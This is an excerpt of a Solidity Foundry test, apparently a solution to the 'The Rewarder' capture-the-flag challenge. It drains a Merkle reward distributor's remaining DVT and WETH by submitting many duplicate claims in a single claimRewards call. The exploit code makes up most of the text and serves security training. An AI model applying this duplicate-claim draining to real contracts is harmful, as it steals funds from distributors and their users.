...
contract TheRewarderChallenge is Test {
    ...
    function test_theRewarder() public checkSolvedByPlayer {
        console.log(address(player));  // player address : 0x44E97aF4418b7a17AABD8090bEA0A471a366305C , distribution index : 188
        uint256 playerDVTAmount = 11524763827831882; 
        uint256 playerWethAmount = 1171088749244340; 
        uint256 iterateCountDVT = (TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT) / playerDVTAmount;
        uint256 iterateCountWETH = (TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT) / playerWethAmount;

        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

        Claim[] memory inputClaim = new Claim[](iterateCountDVT+iterateCountWETH);
        for(uint256 i=0; i<iterateCountDVT+iterateCountWETH; i++){
            if(i < iterateCountDVT ) {
                inputClaim[i] = Claim({
                batchNumber: 0, 
        ...
        tokenList[0] = IERC20(address(dvt));
        tokenList[1] = IERC20(address(weth));

        distributor.claimRewards({inputClaims: inputClaim, inputTokens: tokenList});
